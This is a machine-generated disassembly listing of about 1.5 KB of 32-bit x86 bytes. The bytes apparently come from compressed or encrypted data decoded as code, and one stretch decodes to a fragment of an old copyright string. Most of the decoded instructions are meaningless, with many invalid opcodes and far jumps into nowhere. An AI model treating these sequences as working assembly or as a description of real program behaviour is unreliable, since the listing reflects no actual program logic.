  413160:	7d 3f                	jge    0x4131a1
  413162:	c4 1e                	les    (%esi),%ebx
  413164:	e4 53                	in     $0x53,%al
  413166:	10 ff                	adc    %bh,%bh
  413168:	52                   	push   %edx
  413169:	93                   	xchg   %eax,%ebx
  41316a:	50                   	push   %eax
  41316b:	08 e4                	or     %ah,%ah
  41316d:	58                   	pop    %eax
  41316e:	c3                   	ret
  41316f:	06                   	push   %es
  413170:	5f                   	pop    %edi
  413171:	83 b6 5c 7f eb 18 0d 	xorl   $0xd,0x18eb7f5c(%esi)
  413178:	e8 0f c7 0d 4b       	call   0x4b4ef88c
  41317d:	b4 6f                	mov    $0x6f,%ah
  41317f:	0e                   	push   %cs
  413180:	04 f8                	add    $0xf8,%al
  413182:	01 76 10             	add    %esi,0x10(%esi)
  413185:	80 33 f7             	xorb   $0xf7,(%ebx)
  413188:	f5                   	cmc
  413189:	8e 82 df fa ed 0e    	mov    0xeedfadf(%edx),%es
  41318f:	c9                   	leave
  413190:	d8 33                	fdivs  (%ebx)
  413192:	1b 43 ba             	sbb    -0x46(%ebx),%eax
  413195:	b7 1b                	mov    $0x1b,%bh
  413197:	f2 16                	repnz push %ss
  413199:	50                   	push   %eax
  41319a:	30 54 6a 02          	xor    %dl,0x2(%edx,%ebp,2)
  41319e:	1d e4 92 66 6b       	sbb    $0x6b6692e4,%eax
  4131a3:	0b ba 08 3c 13 01    	or     0x1133c08(%edx),%edi
  4131a9:	e0 6f                	loopne 0x41321a
  4131ab:	f7 61 e5             	mull   -0x1b(%ecx)
  4131ae:	04 4f                	add    $0x4f,%al
  4131b0:	07                   	pop    %es
  4131b1:	50                   	push   %eax
  4131b2:	53                   	push   %ebx
  4131b3:	a1 1c b8 83 dd       	mov    0xdd83b81c,%eax
  4131b8:	fe                   	(bad)
  4131b9:	2d 0c a6 34 41       	sub    $0x4134a60c,%eax
  4131be:	01 80 39 e9 74 0c    	add    %eax,0xc74e939(%eax)
  4131c4:	04 eb                	add    $0xeb,%al
  4131c6:	75 16                	jne    0x4131de
  4131c8:	70 f5                	jo     0x4131bf
  4131ca:	0b 93 be c0 41 41    	or     0x4141c0be(%ebx),%edx
  4131d0:	eb 75                	jmp    0x413247
  4131d2:	83 c1 f6             	add    $0xfffffff6,%ecx
  4131d5:	19 6c c9 67          	sbb    %ebp,0x67(%ecx,%ecx,8)
  4131d9:	33 1c b0             	xor    (%eax,%esi,4),%ebx
  4131dc:	1c e0                	sbb    $0xe0,%al
  4131de:	51                   	push   %ecx
  4131df:	59                   	pop    %ecx
  4131e0:	32 57 1a             	xor    0x1a(%edi),%dl
  4131e3:	72 e1                	jb     0x4131c6
  4131e5:	07                   	pop    %es
  4131e6:	aa                   	stos   %al,%es:(%edi)
  4131e7:	27                   	daa
  4131e8:	ad                   	lods   %ds:(%esi),%eax
  4131e9:	1d 72 f6 11 52       	sbb    $0x5211f672,%eax
  4131ee:	1f                   	pop    %ds
  4131ef:	e2 5a                	loop   0x41324b
  4131f1:	c7                   	(bad)
  4131f2:	3a 37                	cmp    (%edi),%dh
  4131f4:	d9 d9                	(bad)
  4131f6:	61                   	popa
  4131f7:	1d 0f aa e3 1c       	sbb    $0x1ce3aa0f,%eax
  4131fc:	58                   	pop    %eax
  4131fd:	83 e0 86             	and    $0xffffff86,%eax
  413200:	f8                   	clc
  413201:	a1 09 f7 40 04       	mov    0x440f709,%eax
  413206:	59                   	pop    %ecx
  413207:	0f 85 12 0b 2d e4    	jne    0xe46e3d1f
  41320d:	6e                   	outsb  %ds:(%esi),(%dx)
  41320e:	bd 81 38 de 21       	mov    $0x21de3881,%ebp
  413213:	f5                   	cmc
  413214:	18 45 14             	sbb    %al,0x14(%ebp)
  413217:	fb                   	sti
  413218:	13 ff                	adc    %edi,%edi
  41321a:	d4 74                	aam    $0x74
  41321c:	6e                   	outsb  %ds:(%esi),(%dx)
  41321d:	1d 1a 80 8b 15       	sbb    $0x158b801a,%eax
  413222:	0c 71                	or     $0x71,%al
  413224:	d2 0f                	rorb   %cl,(%edi)
  413226:	84 f0                	test   %dh,%al
  413228:	27                   	daa
  413229:	7a b4                	jp     0x4131df
  41322b:	35 a0 ff e2 09       	xor    $0x9e2ffa0,%eax
  413230:	e6 6b                	out    %al,$0x6b
  413232:	be 7f 43 2e 94       	mov    $0x942e437f,%esi
  413237:	63 81 39 ce fa ef    	arpl   %eax,-0x100531c7(%ecx)
  41323d:	0e                   	push   %cs
  41323e:	74 37                	je     0x413277
  413240:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  413241:	98                   	cwtl
  413242:	e8 20 7c 16 1d       	call   0x1d57ae67
  413247:	08 76 29             	or     %dh,0x29(%esi)
  41324a:	26 77 20             	es ja  0x41326d
  41324d:	db ad f6 1a 20 50    	fldt   0x50201af6(%ebp)
  413253:	c1 5e 3c 00          	rcrl   $0x0,0x3c(%esi)
  413257:	58                   	pop    %eax
  413258:	3b aa d6 da de 13    	cmp    0x13dedad6(%edx),%ebp
  41325e:	35 c2 7a 64 0c       	xor    $0xc647ac2,%eax
  413263:	86 0a                	xchg   %cl,(%edx)
  413265:	ad                   	lods   %ds:(%esi),%eax
  413266:	43                   	inc    %ebx
  413267:	3e 4b                	ds dec %ebx
  413269:	3a 01                	cmp    (%ecx),%al
  41326b:	76 1e                	jbe    0x41328b
  41326d:	15 03 dd b0 ad       	adc    $0xadb0dd03,%eax
  413272:	40                   	inc    %eax
  413273:	29 fd                	sub    %edi,%ebp
  413275:	50                   	push   %eax
  413276:	3c f0                	cmp    $0xf0,%al
  413278:	74 0b                	je     0x413285
  41327a:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  41327b:	0a fc                	or     %ah,%bh
  41327d:	6f                   	outsl  %ds:(%esi),(%dx)
  41327e:	83 48 04 02          	orl    $0x2,0x4(%eax)
  413282:	53                   	push   %ebx
  413283:	58                   	pop    %eax
  413284:	1d e8 1b db be       	sbb    $0xbedb1be8,%eax
  413289:	75 86                	jne    0x413211
  41328b:	53                   	push   %ebx
  41328c:	1c 87                	sbb    $0x87,%al
  41328e:	28 da                	sub    %bl,%dl
  413290:	50                   	push   %eax
  413291:	68 3f 2e 34 52       	push   $0x52342e3f
  413296:	dc 40 24             	faddl  0x24(%eax)
  413299:	b6 e8                	mov    $0xe8,%dh
  41329b:	e8 34 28 aa fd       	call   0xfdeb5ad4
  4132a0:	8d                   	lea    (bad),%ebx
  4132a1:	df b7 ae 00 6c a0    	fbstp  -0x5f93ff52(%edi)
  4132a7:	05 8b 6f d8 5f       	add    $0x5fd86f8b,%eax
  4132ac:	04 c7                	add    $0xc7,%al
  4132ae:	47                   	inc    %edi
  4132af:	04 6b                	add    $0x6b,%al
  4132b1:	ab                   	stos   %eax,%es:(%edi)
  4132b2:	31 52 c3             	xor    %edx,-0x3d(%edx)
  4132b5:	27                   	daa
  4132b6:	fc                   	cld
  4132b7:	5a                   	pop    %edx
  4132b8:	cc                   	int3
  4132b9:	9f                   	lahf
  4132ba:	39 12                	cmp    %edx,(%edx)
  4132bc:	63 67 11             	arpl   %esp,0x11(%edi)
  4132bf:	3e 88 26             	mov    %ah,%ds:(%esi)
  4132c2:	11 d7                	adc    %edx,%edi
  4132c4:	60                   	pusha
  4132c5:	f1                   	int1
  4132c6:	d3 b1 07 41 08 d5    	shll   %cl,-0x2af7bef9(%ecx)
  4132cc:	0c b8                	or     $0xb8,%al
  4132ce:	01 07                	add    %eax,(%edi)
  4132d0:	3e 08 41 a8          	or     %al,%ds:-0x58(%ecx)
  4132d4:	04 2f                	add    $0x2f,%al
  4132d6:	74 1f                	je     0x4132f7
  4132d8:	8b 4a 4b             	mov    0x4b(%edx),%ecx
  4132db:	4f                   	dec    %edi
  4132dc:	60                   	pusha
  4132dd:	de 4d 42             	fimuls 0x42(%ebp)
  4132e0:	04 c4                	add    $0xc4,%al
  4132e2:	ca 6a d1             	lret   $0xd16a
  4132e5:	c1 f5 0e             	shl    $0xe,%ebp
  4132e8:	2d 7c 54 1d 22       	sub    $0x221d547c,%eax
  4132ed:	d1 f1                	shl    $1,%ecx
  4132ef:	38 d0                	cmp    %dl,%al
  4132f1:	a8 8f                	test   $0x8f,%al
  4132f3:	ff                   	(bad)
  4132f4:	3b 5a 54             	cmp    0x54(%edx),%ebx
  4132f7:	55                   	push   %ebp
  4132f8:	57                   	push   %edi
  4132f9:	56                   	push   %esi
  4132fa:	53                   	push   %ebx
  4132fb:	2b 07                	sub    (%edi),%eax
  4132fd:	95                   	xchg   %eax,%ebp
  4132fe:	dd 9e c5 f8 5e 52    	fstpl  0x525ef8c5(%esi)
  413304:	e9 4a 53 30 c7       	jmp    0xc7718653
  413309:	4f                   	dec    %edi
  41330a:	33 2f                	xor    (%edi),%ebp
  41330c:	ff                   	ljmp   (bad)
  41330d:	ec                   	in     (%dx),%al
  41330e:	d9 ac 0a 82 7a 0a 89 	fldcw  -0x76f5857e(%edx,%ecx,1)
  413315:	8a 42 0c             	mov    0xc(%edx),%al
  413318:	83 60 04 fd          	andl   $0xfffffffd,0x4(%eax)
  41331c:	f7 6e a5             	imull  -0x5b(%esi)
  41331f:	09 93 7b 0e 08 e8    	or     %edx,-0x17f7f185(%ebx)
  413325:	91                   	xchg   %eax,%ecx
  413326:	b8 b4 d0 a0 d2       	mov    $0xd2a0d0b4,%eax
  41332b:	7c fa                	jl     0x413327
  41332d:	26 00 10             	add    %dl,%es:(%eax)
  413330:	0b 61 97             	or     -0x69(%ecx),%esp
  413333:	bd 84 12 89 11       	mov    $0x11891284,%ebp
  413338:	6e                   	outsb  %ds:(%esi),(%dx)
  413339:	8d 48 39             	lea    0x39(%eax),%ecx
  41333c:	36 0c 94             	ss or  $0x94,%al
  41333f:	3f                   	aas
  413340:	5a                   	pop    %edx
  413341:	8b 64 24 2c          	mov    0x2c(%esp),%esp
  413345:	3f                   	aas
  413346:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  413347:	5d                   	pop    %ebp
  413348:	22 51 17             	and    0x17(%ecx),%dl
  41334b:	ff aa 28 ff e2 c3    	ljmp   *-0x3c1d00d8(%edx)
  413351:	ce                   	into
  413352:	4c                   	dec    %esp
  413353:	5c                   	pop    %esp
  413354:	5c                   	pop    %esp
  413355:	bd db e6 bf 19       	mov    $0x19bfe6db,%ebp
  41335a:	02 bd c2 0c b7 46    	add    0x46b70cc2(%ebp),%bh
  413360:	05 62 c0 24 76       	add    $0x7624c062,%eax
  413365:	2f                   	das
  413366:	4f                   	dec    %edi
  413367:	dd 60 13             	frstor 0x13(%eax)
  41336a:	6f                   	outsl  %ds:(%esi),(%dx)
  41336b:	23 02                	and    (%edx),%eax
  41336d:	3d 92 cd 7f 2c       	cmp    $0x2c7fcd92,%eax
  413372:	ae                   	scas   %es:(%edi),%al
  413373:	3d 8e ff 70 33       	cmp    $0x3370ff8e,%eax
  413378:	ff 08                	decl   (%eax)
  41337a:	15 74 57 2d 05       	adc    $0x52d5774,%eax
  41337f:	0f 2d 87 12 3d 48 74 	cvtps2pi 0x74483d12(%edi),%mm0
  413386:	4e                   	dec    %esi
  413387:	eb ef                	jmp    0x413378
  413389:	7f d9                	jg     0x413364
  41338b:	e8 60 05 71 7e       	call   0x7eb238f0
  413390:	3f                   	aas
  413391:	02 72 36             	add    0x36(%edx),%dh
  413394:	74 30                	je     0x4133c6
  413396:	eb 52                	jmp    0x4133ea
  413398:	3d 96 29 a5 b6       	cmp    $0xb6a52996,%eax
  41339d:	ed                   	in     (%dx),%eax
  41339e:	f9                   	stc
  41339f:	11 74 3d 2d          	adc    %esi,0x2d(%ebp,%edi,1)
  4133a3:	93                   	xchg   %eax,%ebx
  4133a4:	2e 22 13             	and    %cs:(%ebx),%dl
  4133a7:	02 24 69             	add    (%ecx,%ebp,2),%ah
  4133aa:	ff 52 6f             	call   *0x6f(%edx)
  4133ad:	df 2d fd 0e 2f 27    	fildll 0x272f0efd
  4133b3:	3d 74 26 97 b0       	cmp    $0xb0972674,%eax
  4133b8:	c8 eb 2a b0          	enter  $0x2aeb,$0xb0
  4133bc:	c9                   	leave
  4133bd:	eb fe                	jmp    0x4133bd
  4133bf:	77 2d                	ja     0x4133ee
  4133c1:	fe                   	(bad)
  4133c2:	26 b0 cd             	es mov $0xcd,%al
  4133c5:	eb 22                	jmp    0x4133e9
  4133c7:	b0 cf                	mov    $0xcf,%al
  4133c9:	69 0f 1a b0 d7 eb    	imul   $0xebd7b01a,(%edi),%ecx
  4133cf:	16                   	push   %ss
  4133d0:	b0 ce                	mov    $0xce,%al
  4133d2:	eb 12                	jmp    0x4133e6
  4133d4:	b0 c4                	mov    $0xc4,%al
  4133d6:	0d fe 85 11 0e       	or     $0xe1185fe,%eax
  4133db:	b0 da                	mov    $0xda,%al
  4133dd:	eb 0a                	jmp    0x4133e9
  4133df:	b0 d9                	mov    $0xd9,%al
  4133e1:	dc b0 ca 7f f8 36    	fdivl  0x36f87fca(%eax)
  4133e7:	28 6e 95             	sub    %ch,-0x6b(%esi)
  4133ea:	ff d4                	call   *%esp
  4133ec:	52                   	push   %edx
  4133ed:	09 1f                	or     %ebx,(%edi)
  4133ef:	80 5d c2 0e          	sbbb   $0xe,-0x3e(%ebp)
  4133f3:	e3 2d                	jecxz  0x413422
  4133f5:	8c 04 c7             	mov    %es,(%edi,%eax,8)
  4133f8:	f2 42                	repnz inc %edx
  4133fa:	0f c6 3b 19          	shufps $0x19,(%ebx),%xmm7
  4133fe:	2f                   	das
  4133ff:	cb                   	lret
  413400:	3f                   	aas
  413401:	74 70                	je     0x413473
  413403:	28 d5                	sub    %dl,%ch
  413405:	31 c9                	xor    %ecx,%ecx
  413407:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  413408:	63 35 08 75 30 5c    	arpl   %esi,0x5c307508
  41340e:	a3 c0 8f d1 cb       	mov    %eax,0xcbd18fc0
  413413:	3b ff                	cmp    %edi,%edi
  413415:	53                   	push   %ebx
  413416:	14 8b                	adc    $0x8b,%al
  413418:	43                   	inc    %ebx
  413419:	18 35 f9 8c 02 86    	sbb    %dh,0x86028cf9
  41341f:	2e fb                	cs sti
  413421:	23 c5                	and    %ebp,%eax
  413423:	fb                   	sti
  413424:	6c                   	insb   (%dx),%es:(%edi)
  413425:	f4                   	hlt
  413426:	7b e8                	jnp    0x413410
  413428:	ef                   	out    %eax,(%dx)
  413429:	2f                   	das
  41342a:	53                   	push   %ebx
  41342b:	7c 1d                	jl     0x41344a
  41342d:	44                   	inc    %esp
  41342e:	8d 00                	lea    (%eax),%eax
  413430:	f0 fb                	lock sti
  413432:	64 98                	fs cwtl
  413434:	36 0b b8 d9 99 51 14 	or     %ss:0x145199d9(%eax),%edi
  41343b:	38 30                	cmp    %dh,(%eax)
  41343d:	14 86                	adc    $0x86,%al
  41343f:	3c 6c                	cmp    $0x6c,%al
  413441:	5f                   	pop    %edi
  413442:	cd d7                	int    $0xd7
  413444:	50                   	push   %eax
  413445:	30 2c a9             	xor    %ch,(%ecx,%ebp,4)
  413448:	0a 5a 76             	or     0x76(%edx),%bl
  41344b:	ec                   	in     (%dx),%al
  41344c:	30 70 21             	xor    %dh,0x21(%eax)
  41344f:	52                   	push   %edx
  413450:	dc 6a 89             	fsubrl -0x77(%edx)
  413453:	68 a3 05 a0 1f       	push   $0x1fa005a3
  413458:	7f b9                	jg     0x413413
  41345a:	85 bb 98 0a 22 39    	test   %edi,0x39220a98(%ebx)
  413460:	c8 75 64 00          	enter  $0x6475,$0x0
  413464:	28 e8                	sub    %ch,%al
  413466:	0b b4 b8 16 09 83 7c 	or     0x7c830916(%eax,%edi,4),%esi
  41346d:	89 39                	mov    %edi,(%ecx)
  41346f:	01 75 f5             	add    %esi,-0xb(%ebp)
  413472:	62 47 10             	bound  %eax,0x10(%edi)
  413475:	36 0b 01             	or     %ss:(%ecx),%eax
  413478:	83 67 bf 9c          	andl   $0xffffff9c,-0x41(%edi)
  41347c:	2e 35 ba 3e da 08    	cs xor $0x8da3eba,%eax
  413482:	dc 48 ce             	fmull  -0x32(%eax)
  413485:	7f 70                	jg     0x4134f7
  413487:	04 5f                	add    $0x5f,%al
  413489:	60                   	pusha
  41348a:	c8 af 30 5a          	enter  $0x30af,$0x5a
  41348e:	31 90 7e 12 4b 89    	xor    %edx,-0x76b4ed82(%eax)
  413494:	c4 6d 73             	les    0x73(%ebp),%ebp
  413497:	77 18                	ja     0x4134b1
  413499:	44                   	inc    %esp
  41349a:	de 04 23             	fiadds (%ebx,%eiz,1)
  41349d:	96                   	xchg   %eax,%esi
  41349e:	d0 11                	rclb   $1,(%ecx)
  4134a0:	7f ee                	jg     0x413490
  4134a2:	36 10 81 87 35 eb 14 	adc    %al,%ss:0x14eb3587(%ecx)
  4134a9:	20 0c 21             	and    %cl,(%ecx,%eiz,1)
  4134ac:	10 19                	adc    %bl,(%ecx)
  4134ae:	72 3c                	jb     0x4134ec
  4134b0:	44                   	inc    %esp
  4134b1:	41                   	inc    %ecx
  4134b2:	38 3d 77 25 1e 89    	cmp    %bh,0x891e2577
  4134b8:	9e                   	sahf
  4134b9:	5f                   	pop    %edi
  4134ba:	a1 a4 26 4b 8b       	mov    0x8b4b26a4,%eax
  4134bf:	30 f3                	xor    %dh,%bl
  4134c1:	2f                   	das
  4134c2:	3c c9                	cmp    $0xc9,%al
  4134c4:	d8 8b 78 5d ba 3b    	fmuls  0x3bba5d78(%ebx)
  4134ca:	f3 7e 19             	repz jle 0x4134e6
  4134cd:	04 df                	add    $0xdf,%al
  4134cf:	43                   	inc    %ebx
  4134d0:	00 e4                	add    %ah,%ah
  4134d2:	dd ec                	fucomp %st(4)
  4134d4:	89 1d a8 26 5f 3b    	mov    %ebx,0x3b5f26a8
  4134da:	f3 7f ec             	repz jg 0x4134c9
  4134dd:	7a ad                	jp     0x41348c
  4134df:	f0 da f0             	lock (bad)
  4134e2:	5a                   	pop    %edx
  4134e3:	10 07                	adc    %al,(%edi)
  4134e5:	3b 86 ad f4 16 9e    	cmp    -0x61e90b53(%esi),%eax
  4134eb:	ac                   	lods   %ds:(%esi),%al
  4134ec:	c8 3f 0e 1c          	enter  $0xe3f,$0x1c
  4134f0:	41                   	inc    %ecx
  4134f1:	8a ef                	mov    %bh,%ch
  4134f3:	d0 77 27             	shlb   $1,0x27(%edi)
  4134f6:	20 c8                	and    %cl,%al
  4134f8:	c6 05 24 f9 3d 70 83 	movb   $0x83,0x703df924
  4134ff:	4b                   	dec    %ebx
  413500:	d5 6e                	aad    $0x6e
  413502:	7f 8b                	jg     0x41348f
  413504:	18 8d de 09 8b 16    	sbb    %cl,0x168b09de(%ebp)
  41350a:	16                   	push   %ss
  41350b:	07                   	pop    %es
  41350c:	0b 5d 1a             	or     0x1a(%ebp),%ebx
  41350f:	3b 0d c6 08 74 ee    	cmp    0xee7408c6,%ecx
  413515:	ad                   	lods   %ds:(%esi),%eax
  413516:	2b 6c 98 30          	sub    0x30(%eax,%ebx,4),%ebp
  41351a:	1b 4e 33             	sbb    0x33(%esi),%ecx
  41351d:	01 c8                	add    %ecx,%eax
  41351f:	34 1d                	xor    $0x1d,%al
  413521:	b7 30                	mov    $0x30,%bh
  413523:	a3 65 0c ec d7       	mov    %eax,0xd7ec0c65
  413528:	52                   	push   %edx
  413529:	30 4a 1a             	xor    %cl,0x1a(%edx)
  41352c:	9a 90 63 bb 34 04 eb 	lcall  $0xeb04,$0x34bb6390
  413533:	e9 80 9e 6d 1d       	jmp    0x1daed3b8
  413538:	6c                   	insb   (%dx),%es:(%edi)
  413539:	13 4b d9             	adc    -0x27(%ebx),%ecx
  41353c:	f2 1d 38 73 35 9c    	repnz sbb $0x9c357338,%eax
  413542:	2f                   	das
  413543:	6e                   	outsb  %ds:(%esi),(%dx)
  413544:	f4                   	hlt
  413545:	15 e2 0a 92 12       	adc    $0x12920ae2,%eax
  41354a:	bb 40 aa 9d bb       	mov    $0xbb9daa40,%ebx
  41354f:	50                   	push   %eax
  413550:	8b c2                	mov    %edx,%eax
  413552:	32 29                	xor    (%ecx),%ch
  413554:	92                   	xchg   %eax,%edx
  413555:	4c                   	dec    %esp
  413556:	0a 2a                	or     (%edx),%ch
  413558:	c1 27 44             	shll   $0x44,(%edi)
  41355b:	a2 c4 e8 04 20       	mov    %al,0x2004e8c4
  413560:	af                   	scas   %es:(%edi),%eax
  413561:	75 1d                	jne    0x413580
  413563:	82 6f 37 bf          	subb   $0xbf,0x37(%edi)
  413567:	b4 05                	mov    $0x5,%ah
  413569:	2d b0 ff 77 1c       	sub    $0x1c77ffb0,%eax
  41356e:	02 20                	add    (%eax),%ah
  413570:	8b 37                	mov    (%edi),%esi
  413572:	b9 62 5b 2b 65       	mov    $0x652b5b62,%ecx
  413577:	f9                   	stc
  413578:	d0 e1                	shl    $1,%cl
  41357a:	d7                   	xlat   %ds:(%ebx)
  41357b:	87 72 ef             	xchg   %esi,-0x11(%edx)
  41357e:	eb f4                	jmp    0x413574
  413580:	85 7d 19             	test   %edi,0x19(%ebp)
  413583:	c0 40 c9 41          	rolb   $0x41,-0x37(%eax)
  413587:	14 bb                	adc    $0xbb,%al
  413589:	37                   	aaa
  41358a:	52                   	push   %edx
  41358b:	95                   	xchg   %eax,%ebp
  41358c:	72 bf                	jb     0x41354d
  41358e:	be 17 bf 34 04       	mov    $0x434bf17,%esi
  413593:	c7                   	(bad)
  413594:	a1 45 4b b1 f1       	mov    0xf1b14b45,%eax
  413599:	16                   	push   %ss
  41359a:	83 3f 88             	cmpl   $0xffffff88,(%edi)
  41359d:	11 ca                	adc    %ecx,%edx
  41359f:	d0 91 8d 76 bf 0a    	rclb   $1,0xabf768d(%ecx)
  4135a5:	17                   	pop    %ss
  4135a6:	8b e8                	mov    %eax,%ebp
  4135a8:	ff d5                	call   *%ebp
  4135aa:	10 75 ef             	adc    %dh,-0x11(%ebp)
  4135ad:	f6 38                	idivb  (%eax)
  4135af:	dd 63 1b             	frstor 0x1b(%ebx)
  4135b2:	bb 47 96 22 3c       	mov    $0x3c229647,%ebx
  4135b7:	bf 40 0d 16 ba       	mov    $0xba160d40,%edi
  4135bc:	24 8b                	and    $0x8b,%al
  4135be:	b8 67 e3 ef d8       	mov    $0xd8efe367,%eax
  4135c3:	14 02                	adc    $0x2,%al
  4135c5:	ae                   	scas   %es:(%edi),%al
  4135c6:	43                   	inc    %ebx
  4135c7:	90                   	nop
  4135c8:	04 13                	add    $0x13,%al
  4135ca:	eb 1c                	jmp    0x4135e8
  4135cc:	de 0c 3d b3 a1 46 31 	fimuls 0x3146a1b3(,%edi,1)
  4135d3:	52                   	push   %edx
  4135d4:	44                   	inc    %esp
  4135d5:	f0 25 9f 2d c1 49    	lock and $0x49c12d9f,%eax
  4135db:	b1 20                	mov    $0x20,%cl
  4135dd:	36 38 6b 02          	cmp    %ch,%ss:0x2(%ebx)
  4135e1:	75 0a                	jne    0x4135ed
  4135e3:	a9 ba 00 53 9b       	test   $0x9b5300ba,%eax
  4135e8:	6e                   	outsb  %ds:(%esi),(%dx)
  4135e9:	89 b2 75 98 bb c2    	mov    %esi,-0x3d44678b(%edx)
  4135ef:	93                   	xchg   %eax,%ebx
  4135f0:	14 01                	adc    $0x1,%al
  4135f2:	76 05                	jbe    0x4135f9
  4135f4:	db 43 02             	fildl  0x2(%ebx)
  4135f7:	6e                   	outsb  %ds:(%esi),(%dx)
  4135f8:	d7                   	xlat   %ds:(%ebx)
  4135f9:	1c 39                	sbb    $0x39,%al
  4135fb:	5f                   	pop    %edi
  4135fc:	16                   	push   %ss
  4135fd:	3a 9c 0b f2 b3 fb b6 	cmp    -0x49044c0e(%ebx,%ecx,1),%bl
  413604:	f8                   	clc
  413605:	10 3b                	adc    %bh,(%ebx)
  413607:	50                   	push   %eax
  413608:	04 1b                	add    $0x1b,%al
  41360a:	52                   	push   %edx
  41360b:	43                   	inc    %ebx
  41360c:	38 2c 20             	cmp    %ch,(%eax,%eiz,1)
  41360f:	e8 3c 9b bb c4       	call   0xc4fcd150
  413614:	75 73                	jne    0x413689
  413616:	53                   	push   %ebx
  413617:	28 08                	sub    %cl,(%eax)
  413619:	97                   	xchg   %eax,%edi
  41361a:	05 8c 10 a9 a3       	add    $0xa3a9108c,%eax
  41361f:	01 ce                	add    %ecx,%esi
  413621:	a2 06 51 07 61       	mov    %al,0x61075106
  413626:	89 6e 23             	mov    %ebp,0x23(%esi)
  413629:	03 56 3f             	add    0x3f(%esi),%edx
  41362c:	fb                   	sti
  41362d:	03 5e eb             	add    -0x15(%esi),%ebx
  413630:	fe                   	(bad)
  413631:	df a8 d0 8c 50 55    	fildll 0x55508cd0(%eax)
  413637:	dd 6f 6e             	(bad) 0x6e(%edi)
  41363a:	73 20                	jae    0x41365c
  41363c:	43                   	inc    %ebx
  41363d:	6f                   	outsl  %ds:(%esi),(%dx)
  41363e:	70 79                	jo     0x4136b9
  413640:	72 69                	jb     0x4136ab
  413642:	67 74 a3             	addr16 je 0x4135e8
  413645:	ff 85 ba 20 28 63    	incl   0x632820ba(%ebp)
  41364b:	29 20                	sub    %esp,(%eax)
  41364d:	31 39                	xor    %edi,(%ecx)
  41364f:	38 33                	cmp    %dh,(%ebx)
  413651:	bc 39 20 e1 f1       	mov    $0xf1e12039,%esp
  413656:	8a 20                	mov    (%eax),%ah
  413658:	74 0a                	je     0x413664
  41365a:	0f 17 a4 0e 4b ee e9 	movhps %xmm4,0x55e9ee4b(%esi,%ecx,1)
  413661:	55 
  413662:	23 8f 90 e5 c7 ba    	and    -0x45381a70(%edi),%ecx
  413668:	a1 65 e0 10 37       	mov    0x3710e065,%eax
  41366d:	1c c7                	sbb    $0xc7,%al
  41366f:	00 b8 4a f8 d0 0d    	add    %bh,0xdd0f84a(%eax)
  413675:	5a                   	pop    %edx
  413676:	fb                   	sti
  413677:	49                   	dec    %ecx
  413678:	7c 10                	jl     0x41368a
  41367a:	f0 ff 06             	lock incl (%esi)
  41367d:	ca 0c 42             	lret   $0x420c
  413680:	f8                   	clc
  413681:	ab                   	stos   %eax,%es:(%edi)
  413682:	08 99 88 42 9f 67    	or     %bl,0x679f4288(%ecx)
  413688:	85 1b                	test   %ebx,(%ebx)
  41368a:	99                   	cltd
  41368b:	e4 6e                	in     $0x6e,%al
  41368d:	13 29                	adc    (%ecx),%ebp
  41368f:	1a c7                	sbb    %bh,%al
  413691:	03 0e                	add    (%esi),%ecx
  413693:	08 28                	or     %ch,(%eax)
  413695:	eb de                	jmp    0x413675
  413697:	5d                   	pop    %ebp
  413698:	0c f1                	or     $0xf1,%al
  41369a:	4e                   	dec    %esi
  41369b:	75 da                	jne    0x413677
  41369d:	6b 27 24             	imul   $0x24,(%edi),%esp
  4136a0:	21 66 43             	and    %esp,0x43(%esi)
  4136a3:	9b                   	fwait
  4136a4:	b8 41 7f 1a e4       	mov    $0xe41a7f41,%eax
  4136a9:	42                   	inc    %edx
  4136aa:	fc                   	cld
  4136ab:	b6 24                	mov    $0x24,%dh
  4136ad:	bc b0 c1 09 6e       	mov    $0x6e09c1b0,%esp
  4136b2:	0b 48 fc             	or     -0x4(%eax),%ecx
  4136b5:	15 57 eb 03 ec       	adc    $0xec03eb57,%eax
  4136ba:	db 0a                	fisttpl (%edx)
  4136bc:	7e 36                	jle    0x4136f4
  4136be:	87 7b 14             	xchg   %edi,0x14(%ebx)
  4136c1:	4b                   	dec    %ebx
  4136c2:	60                   	pusha
  4136c3:	94                   	xchg   %eax,%esp
  4136c4:	3d 63 43 0a 7e       	cmp    $0x7e0a4363,%eax
  4136c9:	29 c5                	sub    %eax,%ebp
  4136cb:	e8 25 9e 27 7e       	call   0x7e68d4f5
  4136d0:	b6 83                	mov    $0x83,%dh
  4136d2:	c0 09 1f             	rorb   $0x1f,(%ecx)
  4136d5:	ab                   	stos   %eax,%es:(%edi)
  4136d6:	03 4b bf             	add    -0x41(%ebx),%ecx
  4136d9:	07                   	pop    %es
  4136da:	08 5a 89             	or     %bl,-0x77(%edx)
  4136dd:	50                   	push   %eax
  4136de:	fc                   	cld
  4136df:	fa                   	cli
  4136e0:	f8                   	clc
  4136e1:	a2 60 de ab 1a       	mov    %al,0x1aabde60
  4136e6:	70 10                	jo     0x4136f8
  4136e8:	00 6e 6b             	add    %ch,0x6b(%esi)
  4136eb:	c4 50 ab             	les    -0x55(%eax),%edx
  4136ee:	b3 ae                	mov    $0xae,%bl
  4136f0:	93                   	xchg   %eax,%ebx
  4136f1:	f8                   	clc
  4136f2:	8f                   	(bad)
  4136f3:	f9                   	stc
  4136f4:	dc f8                	fdivr  %st,%st(0)
  4136f6:	68 ec d6 9d 09       	push   $0x99dd6ec
  4136fb:	97                   	xchg   %eax,%edi
  4136fc:	89 f0                	mov    %esi,%eax
  4136fe:	94                   	xchg   %eax,%esp
  4136ff:	89 5e 23             	mov    %ebx,0x23(%esi)
  413702:	20 09                	and    %cl,(%ecx)
  413704:	40                   	inc    %eax
  413705:	0b 66 bf             	or     -0x41(%esi),%esp
  413708:	6c                   	insb   (%dx),%es:(%edi)
  413709:	80 bb 16 ba f8 7c d9 	cmpb   $0xd9,0x7cf8ba16(%ebx)
  413710:	8b ea                	mov    %edx,%ebp
  413712:	7a 7f                	jp     0x413793
  413714:	09 29                	or     %ebp,(%ecx)
  413716:	43                   	inc    %ebx
  413717:	b7 03                	mov    $0x3,%bh
  413719:	87 22                	xchg   %esp,(%edx)
  41371b:	eb 67                	jmp    0x413784
  41371d:	3e 37                	ds aaa
  41371f:	97                   	xchg   %eax,%edi
  413720:	29 62 b1             	sub    %esp,-0x4f(%edx)
  413723:	7d 2c                	jge    0x413751
  413725:	ad                   	lods   %ds:(%esi),%eax
  413726:	b6 f7                	mov    $0xf7,%dh
